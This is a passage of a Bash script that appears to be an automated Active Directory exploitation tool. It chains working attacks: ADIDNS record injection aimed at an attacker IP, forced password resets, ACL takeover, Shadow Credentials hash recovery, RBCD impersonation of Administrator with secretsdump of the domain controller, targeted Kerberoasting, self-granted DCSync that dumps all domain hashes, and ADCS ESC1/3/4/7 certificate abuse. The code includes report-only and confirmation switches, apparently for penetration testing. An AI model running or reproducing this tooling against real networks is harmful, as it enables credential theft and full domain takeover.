        elif [[ ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) \
                && "$ll" =~ (member|self|addself|writemembers|genericall|fullcontrol|writedacl|owner|allextendedrights) ]]; then act="group"
        elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
        else continue; fi

        local dkey="${cur_sam}:${act}"
        [[ -n "${ABUSED[$dkey]:-}" ]] && continue
        ABUSED["$dkey"]=1
        # Always abuse by sAMAccountName (cur_sam); cur_name is only for display.
        local tgt="$cur_sam"

        case "$act" in
            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$tgt" ;;
            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
            spn)    _abuse_writespn "$tgt" ;;
            dns)    warn "Writable DNS zone (${C_BOLD}${cur_name}${C_RESET}) → ${C_BOLD}ADIDNS${C_RESET} record injection (BloodHound usually misses this one)"
                    _abuse_adidns "$cur_name" ;;
            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
            full)
                warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
                elif [[ "$cur_class" == "ou" || "$cur_dn" =~ ^[Oo][Uu]= ]]; then
                    loot "GenericAll over OU '${cur_name}' → can restore & reset its (deleted) child objects"
                    info "  → handled in the Account Lifecycle phase (AD Recycle Bin restore → password reset → pivot)"
                elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
                elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
                else _abuse_user_smart "$tgt"; fi ;;
        esac
    done <<<"$w"
}

# AD-integrated DNS: create a useful WPAD record when the identity can create DNS
# child objects. This is a domain-wide primitive; run it once and track rollback.
_abuse_adidns() {
    local zone="$1" record="${ADIDNS_RECORD:-wpad}" ba; mapfile -t ba < <(bloody_args)
    local key="${zone,,}:${record,,}"
    [[ -n "${ADIDNS_DONE[$key]:-}" ]] && { info "  ADIDNS ${record} already attempted for ${zone} in this run"; return; }
    ADIDNS_DONE["$key"]=1

    local ip; ip="$(attacker_ip)"
    if [[ "$DO_ABUSE" != "1" ]]; then
        info "  (report-only; --abuse to create ${record}.${DOMAIN} → ${ip:-LHOST})"
        detail "      bloodyAD --host $DCT --dc-ip $DC_IP -d $DOMAIN -u $USER -k add dnsRecord $record <LHOST>"
        return
    fi
    if [[ -z "$ip" ]]; then
        warn "  ADIDNS abuse skipped: cannot infer callback IP. Export LHOST=<tun0/vpn ip> and rerun."
        return 1
    fi

    abuse_confirm "  Add ADIDNS record '${record}' → ${ip}?" || return 1
    run "bloodyAD ${ba[*]} add dnsRecord '$record' '$ip'"
    local out; out=$(bloodyAD "${ba[@]}" add dnsRecord "$record" "$ip" 2>&1); echo "$out" | tee -a "$LOGFILE"
    if grep -qiE 'success|added|created|written|already' <<<"$out"; then
        loot "★ ADIDNS record available: ${record}.${DOMAIN} → ${ip}"
        rb_record "Added ADIDNS record $record -> $ip" "bloodyAD ${ba[*]} remove dnsRecord '$record'"
        info "  Pair this with relay/coercion or NetNTLM capture; the record is global for later queued identities."
        return 0
    fi
    warn "  Could not create ADIDNS record '$record' in ${zone}"
    return 1
}

# Add the current user to a group we can write (with rollback)
_abuse_group() {
    local grp="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to add $USER to '$grp')"; return; }
    abuse_confirm "  Add ${USER} to group '${grp}'?" || return
    run "bloodyAD ${ba[*]} add groupMember '$grp' '$USER'"
    if bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qi 'added\|success'; then
        loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
        rb_record "Added $USER to group $grp" \
                  "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
        # same identity, more rights → re-assess ONCE by re-queueing self. Guard
        # against looping: without this, the re-assessment re-detects the same
        # group-write and re-queues again and again (the user gets pwned N×).
        if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
            REQUEUED_SELF["${USER,,}"]=1
            unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
            queue_cred "$USER" "$PASS" "$HASH"
        else
            info "  (already re-assessed ${USER} once with new group rights — not looping)"
        fi
    else
        warn "Failed to add to '$grp' (rights may not cover membership)"
    fi
}

# Force-change a target user's password (GenericAll / ForceChangePassword), with rollback note
_abuse_user() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to reset '$target' password)"; return; }
    abuse_confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
    run "bloodyAD ${ba[*]} set password '$target' '$PIVOT_PW'"
    if bloodyAD "${ba[@]}" set password "$target" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qi 'success\|changed'; then
        loot "★ Password of '${target}' reset → pivoting as that user"
        rb_record "Reset password of $target (ORIGINAL UNKNOWN — coordinate restore with client)" \
                  "echo 'Manual action required: restore original password for $target'"
        queue_cred "$target" "$PIVOT_PW" "" "ForceChangePassword/GenericAll reset"
        return 0
    else
        warn "Failed to reset '$target' password"
        return 1
    fi
}

# Take over an object's ACL when we hold WriteOwner / WriteDACL (but not yet a
# usable right): become owner if needed, grant ourselves GenericAll, then drive
# the normal reset/shadow. This is the missing link in WriteOwner→GenericAll→
# reset chains (WriteOwner alone can't reset until you grant yourself the right).
# True (0) if a bloodyAD invocation's output indicates FAILURE. bloodyAD raises on
# error (Traceback + a *Exception) and refusals carry insufficient/ERROR_DS/[-]. Its
# SUCCESS phrasing varies by version ("X has now GenericAll on Y", "... has been
# updated", "X created"...), so detecting failure is far more reliable than matching
# a success string (which silently broke the takeover when bloodyAD changed wording).
_bloody_failed() {
    grep -qiE 'Traceback|Exception|insufficientAccess|INSUFF_ACCESS|ERROR_DS|not allowed|could not|no such object|invalidCredentials|operation.*fail|^\[-\]|[[:space:]]denied' <<<"$1"
}

_abuse_acl_takeover() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
    abuse_confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
    # 1) Try to grant ourselves GenericAll directly (works if we hold WriteDACL or
    #    already own the object). If that's refused, take ownership first. Success is
    #    judged by ABSENCE of a failure marker (bloodyAD success wording varies).
    local _o
    _o=$(bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
    if _bloody_failed "$_o"; then
        run "bloodyAD ${ba[*]} set owner '$target' '$USER'"
        _o=$(bloodyAD "${ba[@]}" set owner "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
        if _bloody_failed "$_o"; then warn "Could not take ownership of '$target'"; return 1; fi
        ok "Took ownership of '$target'"
        rb_record "Set owner of $target to $USER" "echo 'Manual: restore original owner of $target'"
        _o=$(bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
        if _bloody_failed "$_o"; then warn "Took ownership but could not grant GenericAll over '$target' -- ${_o##*$'\n'}"; return 1; fi
    fi
    rb_record "Granted $USER GenericAll over $target" "bloodyAD ${ba[*]} remove genericAll '$target' '$USER'"
    loot "★ Took over ACL of '${target}' (owner/GenericAll) → reset / shadow"
    _abuse_shadowcred "$target" || _abuse_user "$target"
}

# Smart takeover of a user we have full/partial control over: non-destructive
# Shadow Credentials first, then a direct password reset (GenericAll /
# ForceChangePassword), and only if those fail, a WriteOwner/WriteDACL takeover.
_abuse_user_smart() {
    local target="$1"
    _abuse_shadowcred "$target" && return 0
    _abuse_user "$target"       && return 0
    _abuse_acl_takeover "$target"
}

# Shadow Credentials (msDS-KeyCredentialLink) → recover target's NT hash via PKINIT.
# Non-destructive (certipy 'auto' adds the key, authenticates, then removes it).
# Returns 0 if it recovered a hash.
_abuse_shadowcred() {
    local target="$1"
    { have certipy || have bloodyAD; } || return 1
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
    # Dedup: if we already recovered this target's hash (another ACL path / BH edge
    # in this run), don't re-run the whole flow — it's slow and just spams duplicate
    # output. One success per target is enough.
    if [[ -s "$OUTDIR/recovered_hashes.txt" ]] && grep -qiE "^${target//$/\\$}[[:space:]]" "$OUTDIR/recovered_hashes.txt" 2>/dev/null; then
        info "  Shadow Credentials on '$target' already done (hash recovered) → skipping repeat"
        return 0
    fi
    abuse_confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
    # If the writer is in Protected Users, NTLM is dead and certipy's Kerberos LDAP
    # bind chokes (data 57) — skip certipy and go straight to bloodyAD (its Kerberos
    # PKINIT flow works for these accounts).
    local prot=0; [[ "${OWNED_GROUPS[${USER,,}]:-}" == *"Protected Users"* ]] && prot=1
    local nt=""
    if have certipy && [[ "$prot" == "0" ]]; then
        # Prefer password/hash (certipy Kerberos is flaky); ccache only as fallback.
        local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
        if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
        elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
        elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
        run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
        local out; out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
        if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
           && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
            cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
            out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
        fi
        echo "$out" | tee -a "$LOGFILE"
        nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
    elif [[ "$prot" == "1" ]]; then
        info "  ${USER} is in Protected Users → NTLM/certipy bind won't work; using bloodyAD (Kerberos PKINIT)"
    fi
    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
        loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
        note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
        queue_cred "$target" "" "$nt" "Shadow Credentials"
        return 0
    fi

    # certipy's LDAP bind can fail (data 57; or the writer is in Protected Users so
    # NTLM is dead and certipy's Kerberos chokes). bloodyAD does the SAME flow
    # (write msDS-KeyCredentialLink → PKINIT → NT hash) over Kerberos and works
    # where certipy doesn't — and Kerberos auth is proven to work for these accounts.
    if have bloodyAD; then
        local -a ba2; mapfile -t ba2 < <(bloody_args)
        run "bloodyAD ${ba2[*]} add shadowCredentials '$target'"
        local bo; bo=$( cd "$OUTDIR" && bloodyAD "${ba2[@]}" add shadowCredentials "$target" 2>&1 ); echo "$bo" | tee -a "$LOGFILE"
        # Only parse a hash if it ACTUALLY succeeded. bloodyAD prints a 64-char
        # "sha256 of RSA key" line during key generation even when the LDAP write is
        # then refused (insufficient rights) — a greedy [0-9a-f]{32} would slice that
        # sha256 in half and report garbage as the NT hash (queuing a dead cred).
        # Bail on any failure, and match the hash with WORD BOUNDARIES (so a 64-char
        # sha256 can never yield a 32-char "match") while skipping the sha256 line.
        nt=""
        if ! grep -qiE 'insufficient|INSUFF_ACCESS|Traceback|Exception|denied|could not|not allowed|\[-\]' <<<"$bo"; then
            nt=$(grep -viE 'sha256' <<<"$bo" | grep -oiE '\b[0-9a-f]{32}\b' | grep -viE '^aad3b435b51404eeaad3b435b51404ee$' | tail -1)
        fi
        if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
            rb_record "Shadow Credentials (KeyCredentialLink) added on $target" \
                      "bloodyAD ${ba2[*]} remove shadowCredentials '$target'"
            loot "★ Shadow Credentials (bloodyAD/PKINIT) → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
            note_cred_source "$target" "Shadow Credentials (bloodyAD PKINIT)"
            queue_cred "$target" "" "$nt" "Shadow Credentials (bloodyAD)"
            return 0
        fi
    fi
    warn "Shadow Credentials did not yield a hash for $target"; return 1
}

# Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
# computer we control, then impersonate Administrator to it.
_abuse_rbcd() {
    local target="$1"   # must be a COMPUTER object we can write (e.g. DC$)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try RBCD on '$target')"; return 1; }
    # RBCD needs the target to have an SPN to request a service ticket to — i.e. a
    # computer account. Writing the attribute on a user is a dead end, so don't
    # waste a machine-account creation + noisy traceback on it.
    [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
    have impacket-getST && have impacket-addcomputer || return 1
    abuse_confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
    local ba; mapfile -t ba < <(bloody_args)
    local cpass="ADAutoPwn_RBCD_123!" dch="${DC_FQDN:-$DCT}"
    run "impacket-addcomputer (adpwn\$) via $USER"
    # Kerberos addcomputer REQUIRES -dc-host (DNS name), or it errors out.
    local addout
    if   [[ -n "$HASH" ]]; then addout=$(impacket-addcomputer "$DOMAIN/$USER" -hashes ":$HASH" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
    elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then addout=$(KRB5CCNAME="$KERB_TICKET" impacket-addcomputer "$DOMAIN/$USER" -k -no-pass -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
    else addout=$(impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1); fi
    echo "$addout" | tee -a "$LOGFILE"
    if ! grep -qiE 'Successfully added|added the machine account' <<<"$addout"; then
        warn "Could not add machine account (MachineAccountQuota=0 or no rights) → RBCD not possible from $USER"
        return 1
    fi
    rb_record "Created machine account adpwn\$" "impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -dc-host '$dch' -computer-name 'adpwn\$' -delete 2>/dev/null"
    run "bloodyAD add rbcd '$target' 'adpwn\$'"
    bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
    rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
    local svc="cifs/${target%\$}.${DOMAIN}"
    run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
    # Real success only — getST prints "Saving ticket in <file>". Don't fall for a
    # stale .ccache lying in CWD (that produced bogus "RBCD succeeded" before).
    local stfile; stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | head -1)
    if [[ -n "$stfile" && -f "$stfile" ]] && ! grep -qiE 'KDC_ERR|SessionError|does not have' <<<"$stout"; then
        mv -f "$stfile" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
        loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
        note_cred_source "Administrator@$target" "RBCD impersonation"
        if [[ "${target%\$}" == "$DC_HOST" ]]; then
            subsection "RBCD ticket targets the DC → secretsdump"
            KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
                -outputfile "$OUTDIR/dcsync_rbcd" 2>&1 | tee -a "$LOGFILE" | tee -a "$OUTDIR/secretsdump.txt"
        fi
        return 0
    fi
    warn "RBCD did not produce a usable ticket for $target"; return 1
}

# Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
_abuse_writespn() {
    local target="$1"; local ba pba; mapfile -t ba < <(bloody_args)
    [[ "$CAP_KERBEROS" != "1" ]] && return
    warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
    abuse_confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
    local spn="ADAUTOPWN/$target"
    local setout auth_used="kerberos"
    run "bloodyAD ${ba[*]} set object '$target' servicePrincipalName -v '$spn'"
    setout=$(bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1); echo "$setout" | tee -a "$LOGFILE"

    # Keep Kerberos-first, but some bloodyAD/certipy builds fail LDAP SASL while
    # the same account works with a simple bind. Treat that as a tool fallback,
    # not as a policy change.
    if ! grep -qiE 'success|added|modif|written|updated|created|removed|has been' <<<"$setout" && [[ -n "$PASS$HASH" ]]; then
        mapfile -t pba < <(bloody_args_plain)
        if [[ ${#pba[@]} -gt 0 ]]; then
            auth_used="plain"
            warn "Kerberos SPN write failed for '$target' → retrying bloodyAD with password/hash fallback"
            run "bloodyAD ${pba[*]} set object '$target' servicePrincipalName -v '$spn'"
            setout=$(env -u KRB5CCNAME bloodyAD "${pba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1); echo "$setout" | tee -a "$LOGFILE"
        fi
    fi

    if grep -qiE 'success|added|modif|written|updated|created|removed|has been' <<<"$setout"; then
        local -a rba=("${ba[@]}")
        [[ "$auth_used" == "plain" && ${#pba[@]} -gt 0 ]] && rba=("${pba[@]}")
        rb_record "Set temporary SPN $spn on $target" \
                  "bloodyAD ${rba[*]} remove object '$target' servicePrincipalName -v '$spn'"
        local outf="$OUTDIR/kerberoast_writespn_$(_safe_name "$target").txt"
        run "impacket-GetUserSPNs $(imp_principal) -k -no-pass -request-user $target"
        local roastout
        roastout=$(KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
            -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1)
        echo "$roastout" | tee -a "$LOGFILE"
        grep -oP '\$krb5tgs\$[^\r\n]+' <<<"$roastout" >>"$outf" 2>/dev/null || true
        [[ -s "$outf" ]] && sort -u -o "$outf" "$outf"
        if [[ -s "$outf" ]]; then
            loot "★ WriteSPN Kerberoast hash captured for $target"
            cat "$outf" >>"$OUTDIR/kerberoast_hashes.txt"
            [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
        fi
        bloodyAD "${rba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
        ok "Temporary SPN removed from $target"
    else
        warn "Could not set SPN on $target — last bloodyAD error above"
    fi
}

# WriteDACL / GenericAll over the DOMAIN head → grant ourselves DCSync, then dump.
_abuse_dcsync_dacl() {
    local ba; mapfile -t ba < <(bloody_args)
    warn "Writable DACL on the domain head → can self-grant ${C_BOLD}DCSync${C_RESET}"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to grant $USER DCSync and dump the domain)"; return; }
    abuse_confirm "  Grant '${USER}' DCSync rights on '${DOMAIN}' and dump all hashes?" || return
    run "bloodyAD ${ba[*]} add dcsync '$USER'"
    if bloodyAD "${ba[@]}" add dcsync "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|grant|written|dcsync'; then
        loot "★ Granted DCSync to ${USER} — replicating the domain"
        rb_record "Granted DCSync to $USER on $DOMAIN" "bloodyAD ${ba[*]} remove dcsync '$USER'"
        phase_dcsync
    else
        warn "Could not self-grant DCSync (WriteDACL may not cover the domain object)"
    fi
}

# ADCS ESC1: request a cert impersonating Administrator, then auth → NT hash/TGT.
# Best-effort parse of certipy output for CA + a template flagged ESC1.
# ---- ADCS auto-abuse: certipy already IDENTIFIES each ESC (find -vulnerable);
# here we ABUSE each one. Auth is password/hash-first (certipy's Kerberos LDAP
# bind is flaky) and every call carries -target/-dc-ip. ------------------------
_ADCS_AUTH=(); _ADCS_ENV=()
_adcs_setauth() {                       # build certipy auth args for the current cred
    _ADCS_AUTH=(-u "${USER}@${DOMAIN}"); _ADCS_ENV=()
    if   [[ -n "$PASS" ]]; then _ADCS_AUTH+=(-p "$PASS"); _ADCS_ENV=(env -u KRB5CCNAME)
    elif [[ -n "$HASH" ]]; then _ADCS_AUTH+=(-hashes ":$HASH"); _ADCS_ENV=(env -u KRB5CCNAME)
    elif [[ -n "$KERB_TICKET" ]]; then _ADCS_AUTH+=(-k -no-pass); _ADCS_ENV=(env "KRB5CCNAME=$KERB_TICKET"); fi
}
_adcs_template_for() {                  # template name certipy tied to a given ESC tag
    awk -v esc="$2" 'BEGIN{IGNORECASE=1}/Template Name/{t=$0} $0 ~ esc {print t}' <<<"$1" \
        | grep -ioP 'Template Name\s*:\s*\K\S+' | head -1
}
_adcs_admin_sid() {                     # domain Administrator (RID 500) SID, best-effort
    local ba sid; mapfile -t ba < <(bloody_args)
    sid=$(bloodyAD "${ba[@]}" get object "$USER" --attr objectSid 2>/dev/null | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
    [[ -n "$sid" ]] && echo "${sid%-*}-500"
}
# certipy auth a PFX → recover the principal's NT hash (or TGT) and pivot on it.
# `</dev/null` stops certipy's interactive "save private key? (y/N)" prompt from
# hanging. selfok=1 (ESC13) accepts authenticating as ourselves (we gain a group);
# otherwise authenticating as our own account is NOT an escalation → reject it.
_adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [selfok]
    local pfx="$1" label="$2" selfok="${3:-0}"
    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
    run "certipy auth -pfx $pfx -dc-ip $DC_IP"
    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" </dev/null 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
    # WHO did the cert actually authenticate as? (certipy may issue for the
    # requester, not the impersonated UPN, if the template forbids the SAN.)
    local who; who=$(grep -oiP "Got hash for '?\K[^'@ ]+" <<<"$aout" | head -1)
    local nt;  nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ && -n "$who" ]]; then
        if [[ "${who,,}" == "${USER,,}" && "$selfok" != "1" ]]; then
            info "  ${label}: cert only authenticated as ${who} (self) — template doesn't allow impersonation here"
            return 1
        fi
        rb_record "${label}: certificate issued/used for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
        loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
        note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt" "ADCS ${label}"; return 0
    fi
    local cc; cc=$(ls -t "$OUTDIR"/*.ccache 2>/dev/null | head -1)
    [[ -n "$cc" ]] && grep -qiE 'Saving credential cache|Got TGT' <<<"$aout" \
        && { loot "${label} → TGT cached → $(basename "$cc") (export KRB5CCNAME=)"; return 0; }
    warn "  ${label}: cert issued but auth gave no usable hash/TGT — finish manually"; return 1
}
# Request a cert AS Administrator (SAN/UPN impersonation), then auth+pivot.
# with_sid=1 embeds the SID extension (strong-mapping envs: ESC1/2/6/15);
# with_sid=0 omits it (the whole point of ESC9/10/16 is the missing extension).
_adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <with_sid> [extra…]
    local ca="$1" tpl="$2" label="$3" with_sid="$4"; shift 4
    _adcs_setauth
    abuse_confirm "  ${label}: request a cert as Administrator via '$tpl' on CA '$ca'?" || return 1
    local sidargs=(); [[ "$with_sid" == "1" && -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
    local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                 "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
    run "certipy ${rargs[*]}"
    # Pipe 'y' (yes): certipy asks "Overwrite? (y/n)" when a prior attempt left a
    # PFX, and "save private key? (y/N)" on a failed request — `</dev/null` made
    # those EOF and we LOST a freshly-issued cert. `yes` answers them so the cert
    # is always written, then we read its real filename from certipy's own output.
    local out; out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
    _adcs_pwn_pfx "$pfx" "$label"
}

# ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
_adcs_esc3() {
    local ca="$1" agenttpl="$2"; _adcs_setauth
    abuse_confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
    local o1; o1=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
    local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o1" | tail -1 | xargs -r basename)
    [[ -z "$agent" || ! -f "$OUTDIR/$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
    local o2; o2=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
        -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$agent" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o2" | tail -1 | xargs -r basename)
    _adcs_pwn_pfx "$pfx" "ESC3"
}
# ESC4 — writable template ACL: push an ESC1-vulnerable config, exploit, then restore.
_adcs_esc4() {
    local ca="$1" tpl="$2"; _adcs_setauth
    abuse_confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
        -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    rb_record "ESC4: overwrote template $tpl config" \
              "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
    _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
    # restore the original template configuration (best-effort)
    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" \
        -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    return $rc
}
# ESC7 — ManageCA/ManageCertificates: enable SubCA, request (pending), self-issue, retrieve.
_adcs_esc7() {
    local ca="$1"; _adcs_setauth
    abuse_confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
